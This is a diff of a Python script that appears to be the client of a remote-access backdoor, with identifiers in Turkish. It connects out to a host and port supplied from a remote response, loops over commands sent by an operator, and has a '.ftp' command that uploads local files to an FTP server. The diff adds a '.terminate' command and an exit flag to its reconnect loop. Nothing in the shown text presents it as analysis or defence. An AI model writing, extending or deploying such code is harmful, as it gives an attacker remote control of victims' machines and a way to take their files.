@@ -9,6 +9,9 @@ import os
 
 pathDi = []
 backK = ["hello"]
+exiT = [False]
+backD = [True]
+
 def dosyayiYukle(ftp, dosyaYolu, uzakDosyaName):
     with open(dosyaYolu, 'rb') as dosya:
         ftp.storbinary(f'STOR {uzakDosyaName}', dosya)
@@ -19,8 +22,7 @@ def connect():
     s.connect((response[0], int(response[1])))
     return s
 
-def handle_client(s):
-    backD = [True]
+def handle_client(s):  
     while True:
 
         if backD[-1]:
@@ -81,6 +83,12 @@ def handle_client(s):
                 continue
 
 
+            elif commanDec.lower() == ".terminate":
+                exiT.append(True)
+                exit()
+                exit()
+
+
             elif commanDec[:4] == ".ftp" and len(commanDec) > 5:
                 args = commanDec.split()
                 dosyaYoluIndex = args.index('-file') + 1
@@ -117,7 +125,7 @@ def main():
             time.sleep(10)
 
 
-while True:
+while not exiT[-1]:
     try:
         main()
         time.sleep(15)
